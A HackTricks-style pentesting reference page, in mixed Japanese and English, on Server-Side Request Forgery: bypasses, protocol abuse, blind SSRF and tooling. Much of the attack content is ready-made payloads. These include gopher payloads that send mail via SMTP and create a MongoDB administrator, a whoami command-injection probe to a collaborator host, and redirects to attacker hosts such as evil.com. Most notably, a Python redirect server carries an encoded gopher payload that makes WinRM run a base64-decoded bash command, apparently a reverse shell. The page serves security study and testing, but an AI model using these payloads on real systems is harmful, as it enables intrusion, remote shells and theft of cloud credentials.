# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

**Server-side Request Forgery (SSRF)** 脆弱性は、攻撃者が **サーバー側アプリケーション** を操作して攻撃者の任意のドメインへ **HTTP リクエスト** を送らせるときに発生します。この脆弱性により、サーバーは攻撃者が指示する任意の外部リクエストにさらされます。

## SSRF のキャプチャ

最初に行うべきは、自分が生成した SSRF インタラクションをキャプチャすることです。HTTP や DNS のインタラクションをキャプチャするために次のようなツールを使用できます:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - ngrok を利用した Burp Collaborator

## ホワイトリスト化されたドメインのバイパス

通常、SSRF は **特定のホワイトリスト化されたドメイン** や URL のみで動作することが多いです。以下のページには、**そのホワイトリストをバイパスするために試すべき手法のまとめ** が掲載されています:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via Open Redirect

サーバーが正しく保護されている場合でも、ウェブページ内の Open Redirect を悪用することで **すべての制限をバイパスできる可能性があります**。ウェブページが **同一ドメインへの SSRF を許可** し、かつリダイレクトに従う場合、Open Redirect を利用してサーバーに内部の任意のリソースへアクセスさせることができます。\
詳細はこちら: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## プロトコル

- **file://**
- URL スキーム `file://` は直接 `/etc/passwd` を指す例として使用されます: `file:///etc/passwd`
- **dict://**
- DICT URL スキームは、DICT プロトコル経由で定義や単語リストにアクセスするために使われます。例として特定の単語、データベース、エントリ番号を指定する構築された URL が示されており、攻撃者提供の認証情報を使って DICT サーバーに接続するために PHP スクリプトが悪用される可能性があることが挙げられています: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- secure shell 上での安全なファイル転送のためのプロトコルとして挙げられ、悪意ある SFTP サーバーに接続するために PHP スクリプトが悪用される例が示されています: `url=sftp://generic.com:11111/`
- **TFTP://**
- UDP 上で動作する Trivial File Transfer Protocol が言及されており、TFTP サーバーへリクエストを送るよう設計された PHP スクリプトの例が示されています。TFTP リクエストはポート '12346' の 'generic.com' に対して 'TESTUDPPACKET' を要求します: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Lightweight Directory Access Protocol に関する節で、IP ネットワーク上の分散ディレクトリ情報サービスの管理とアクセスに使われることを強調しています。ローカルホスト上の LDAP サーバーとやり取りする例: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- SSRF 脆弱性を利用してローカルホスト上の SMTP サービスとやり取りする手法が説明されており、内部ドメイン名を明らかにする手順や、その情報に基づく追加調査の方法が含まれています。
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- SSRFが**curl**によって実行される場合、curlには[**URL globbing**](https://everything.curl.dev/cmdline/globbing)という機能があり、WAFsのバイパスに役立つことがあります。例えばこの[**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi)には**path traversal via `file` protocol**の例が掲載されています：
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Gopher プロトコルがサーバー通信のために **IP, port and bytes** を指定できること、ペイロード作成に役立つ Gopherus や remote-method-guesser といったツールについて説明されています。2つの異なる用途が示されています:

### Gopher://

Using this protocol you can specify the **IP, port and bytes** you want the server to **send**. Then, you can basically exploit a SSRF to **communicate with any TCP server** (but you need to know how to talk to the service first).\
幸いにも、[Gopherus](https://github.com/tarunkant/Gopherus) を使っていくつかのサービス向けのペイロードを作成できます。さらに、[remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) は _gopher_ ペイロードを _Java RMI_ サービス向けに作成するために使用できます。

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — 1337へのBack connect**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- username=admin、password=admin123、permission=administrator を持つユーザーを作成
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## Referrer header 等を介した SSRF

サーバ上の分析ソフトウェアは受信リンクを追跡するために Referrer header を記録することが多く、この運用が意図せずアプリケーションを Server-Side Request Forgery (SSRF) の脆弱性に晒すことがある。これは、分析ソフトが参照元サイトの内容を解析するために Referrer header に記載された外部URLを実際に訪問する場合があるためである。これらの脆弱性を発見するためには、分析ツールが Referer header を処理する挙動を利用して潜在的な SSRF 攻撃面を検出する Burp Suite プラグイン "Collaborator Everywhere" の使用が推奨される。

## 証明書の SNI データを介した SSRF

簡単な設定で任意のバックエンドへの接続を可能にしてしまう誤設定の例を、以下の Nginx 設定例で示す:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
この構成では、Server Name Indication (SNI) フィールドの値がそのままバックエンドのアドレスとして使用されます。  
この設定は Server-Side Request Forgery (SSRF) の脆弱性を生じさせ、SNI フィールドに目的の IP アドレスやドメイン名を指定するだけで悪用可能です。  
以下は、`openssl` コマンドを使用して `internal.host.com` のような任意のバックエンドへの接続を強制する悪用例です。
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF via TLS AIA CA Issuers (Java mTLS)

一部の TLS スタックは、ピア証明書内の **Authority Information Access (AIA) → CA Issuers** URI を使って不足している中間 CA を自動的にダウンロードします。**Java** では、mTLS サービスを実行する際に `-Dcom.sun.security.enableAIAcaIssuers=true` を有効にすると、サーバはクライアント証明書の攻撃者制御下にある URI を**during the handshake**に参照し、HTTP ロジックが動く前にアクセスします。

- **Requirements**: mTLS が有効で、Java の AIA フェッチが有効、攻撃者が細工した AIA CA Issuers URI を含むクライアント証明書を提示できること。
- **Triggering SSRF** (Java 21 example):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
Java の certpath デバッグ出力は `CertStore URI:http://localhost:8080` を示し、`nc` は `-Dhttp.agent` で設定可能な `User-Agent` を含む HTTP リクエストをキャプチャします。これにより、証明書検証中の SSRF が証明されます。
- **DoS via file://**: AIA CA Issuers を `file:///dev/urandom` に設定すると、Unix 系ホスト上で Java はそれを CertStore とみなし、無制限のランダムバイトを読み続けて CPU コアを占有し、クライアント切断後も後続の接続をブロックします。

## SSRF via CSS Pre-Processors

LESS は変数、ミックスイン、関数、強力な `@import` ディレクティブを追加する人気のある CSS pre-processor です。コンパイル時に LESS エンジンは `@import` 文で参照されるリソースを取得し、`(inline)` オプションが有効な場合はその内容を生成される CSS に埋め込み（"inline"）ます。

Check how to exploit it in:

{{#ref}}
../xs-search/css-injection/less-code-injection.md
{{#endref}}


## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

試してみる価値があるペイロードは次のとおりです: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDFs Rendering

ウェブページがあなたの提供した情報を使って自動的に PDF を生成する場合、PDF を作成するプロセス（サーバ）自身によって PDF 作成時に実行される JS を挿入することで SSRF を悪用できる可能性があります。 [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## From SSRF to DoS

複数のセッションを作成し、セッションから SSRF を利用して大容量ファイルをダウンロードしてみてください。

## SSRF PHP Functions

脆弱な PHP や Wordpress 関数については次のページを参照してください:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

一部の悪用では、異なるプロトコル（例えば gopher）を使うために **send a redirect response** が必要になる場合があります。以下はリダイレクトで応答するためのいくつかの python コードです:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## 誤設定プロキシによる SSRF

トリック [**この記事から**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask プロキシの脆弱なコード</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flaskでは、先頭文字として**`@`**を使用できるため、**最初のホスト名をユーザー名にして**新しいホスト名を注入できます。攻撃リクエスト:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

脆弱なコード:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

リクエストの**パスを先頭に置く**ことが、文字 **`;`** を用いて可能であることが判明しました。これにより **`@`** を使ってアクセス先のホストを注入できます。攻撃リクエスト:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP 組み込み Web サーバ <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>脆弱な PHP コード</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHPはURLのパスでスラッシュの前に**文字 `*` を使用することを許可します**が、いくつか制限があります。例えば、それはルートパス名 `/` の場合にのみ使用でき、最初のスラッシュの前にドット `.` を置くことは許可されていないため、例えばドット無しの16進表現のIPアドレスを使用する必要があります:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

If you are having **problems** to **exfiltrate content from a local IP** because of **CORS/SOP**, **DNS Rebidding** can be used to bypass that limitation:


{{#ref}}
../cors-bypass.md
{{#endref}}

### Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) は [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) 攻撃を行うためのツールです。攻撃サーバの DNS 名の IP アドレスをターゲットマシンの IP にリバインドし、ターゲット上の脆弱なソフトウェアを悪用するための攻撃ペイロードを配信するために必要なコンポーネントを含みます。

Check out also the **publicly running server in** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requirements:

- **SSRF**
- **Outbound TLS sessions**
- **Stuff on local ports**

Attack:

1. Ask the user/bot **access** a **domain** controlled by the **attacker**
2. The **TTL** of the **DNS** is **0** sec (so the victim will check the IP of the domain again soon)
3. A **TLS connection** is created between the victim and the domain of the attacker. The attacker introduces the **payload inside** the **Session ID or Session Ticket**.
4. The **domain** will start an **infinite loop** of redirects against **himself**. The goal of this is to make the user/bot access the domain until it perform **again** a **DNS request** of the domain.
5. In the DNS request a **private IP** address is given **now** (127.0.0.1 for example)
6. The user/bot will try to **reestablish the TLS connection** and in order to do so it will **send** the **Session** ID/Ticket ID (where the **payload** of the attacker was contained). So congratulations you managed to ask the **user/bot attack himself**.

Note that during this attack, if you want to attack localhost:11211 (_memcache_) you need to make the victim establish the initial connection with www.attacker.com:11211 (the **port must always be the same**).\
To **perform this attack you can use the tool**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
For **more information** take a look to the talk where this attack is explained: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

blind SSRF と非-blind の違いは、blind では SSRF リクエストのレスポンスを確認できない点です。そのため、既知の脆弱性しか悪用できず、攻撃がより難しくなります。

### Time based SSRF

サーバのレスポンスの**Checking the time**により、リソースが存在するかどうかを**possible to know if a resource exists or not**判別できる場合があります（存在するリソースへアクセスする方が存在しないものへアクセスするより時間がかかることがあるため）。

### From blid to full abusing status codes

According to this [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), some blind SSRF might happen because even if the targeted URL responds with a 200 status code (like AWS metadata), this dat is not properly formatted and therefore the app might refuse to show it.

However, it as found that sending some redirecs responses from 305 to 309 in the SSRF it might possible to makethen application **follow these redirects while entering an error mode** that no longer will check the format of the data and might just print it.

The python server used to exploit this is th following:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**手順:**
- 最初に 302 でアプリにフォローを開始させる。
- 次に 305 → 306 → 307 → 308 → 309 → 310 を受け取る。
- 5 回目の奇妙なコードの後、PoC は最終的に 302 → 169.254.169.254 → 200 OK を返す。

**ターゲット内部で何が起きているか:**
- libcurl 自体は 305–310 を追跡する; 未知のコードを単に “follow” に正規化するだけである。
- N 回の奇妙なリダイレクト（ここでは ≥ 5）を経ると、アプリケーション自身の wrapper が「何かおかしい」と判断し、デバッグ用のエラーモードに切り替える。
- そのモードでは、リダイレクトチェーン全体と最終的な body を外部の caller にダンプする。
- 結果: attacker は全ての header と metadata JSON を確認でき、mission accomplished。

Note that this is interesting to leak status codes that you couldn't leak before (like a 200). However, if somehow you could also select the status code of the response (imagine that you can decide that the AWS metadata responds with a 500 status code), **there might be some status codes that directly leak the content of the response.**

### HTML-to-PDF renderers as blind SSRF gadgets

Libraries such as **TCPDF** (and wrappers like **spipu/html2pdf**) will automatically fetch any URLs present in attacker-controlled HTML while rendering a PDF. Each `<img>` or `<link rel="stylesheet">` attribute is resolved server-side via cURL, `getimagesize()`, or `file_get_contents()`, so you can drive the PDF worker to probe internal hosts even though no HTTP response is reflected to you.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 は各 `<img>` リソースに対して複数回の取得試行を行うため、単一のペイロードで複数のリクエストが発生することがあり（タイミングベースのポートスキャンに有用）。
- html2pdf は `<img>` に対して TCPDF の挙動を踏襲し、`Css::extractStyle()` 内で CSS の取得を追加します。これは浅いスキームチェックの後に単に `file_get_contents($href)` を呼び出すだけなので、loopback services、RFC1918 ranges、または cloud metadata endpoints を叩くために悪用できます。
- この SSRF primitive を [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) と組み合わせることで、内部の HTTP レスポンスとローカルファイルの両方を PDF にレンダリングされた状態で leak できます。

ハードナーはレンダリング前に外部 URL を除去するか、レンダラーをネットワークサンドボックスで分離すべきです。そうするまで、PDF ジェネレーターは blind SSRF proxies と見なしてください。

## Cloud SSRF Exploitation

もし cloud 環境内で動作するマシンに SSRF 脆弱性を見つけた場合、cloud 環境に関する興味深い情報や場合によっては認証情報を取得できる可能性があります:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF Vulnerable Platforms

既知のいくつかのプラットフォームには過去に SSRF 脆弱性が含まれていることがあるので、次を確認してください:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Tools

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Tool to detect and exploit SSRF vulnerabilities

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

This tool generates Gopher payloads for:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ は、一般的な _Java RMI_ 脆弱性向けの攻撃操作をサポートする脆弱性スキャナです。ほとんどの操作は `--ssrf` オプションをサポートしており、要求された操作のための _SSRF_ ペイロードを生成します。`--gopher` オプションと組み合わせることで、利用可能な gopher ペイロードを直接生成できます。

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy は、Server-Side Request Forgery (SSRF) に脆弱な HTTP サーバーを経由してクライアントの HTTP トラフィックをトンネリングすることを目的としたマルチスレッドの HTTP プロキシサーバーです。

### To practice


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## References

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
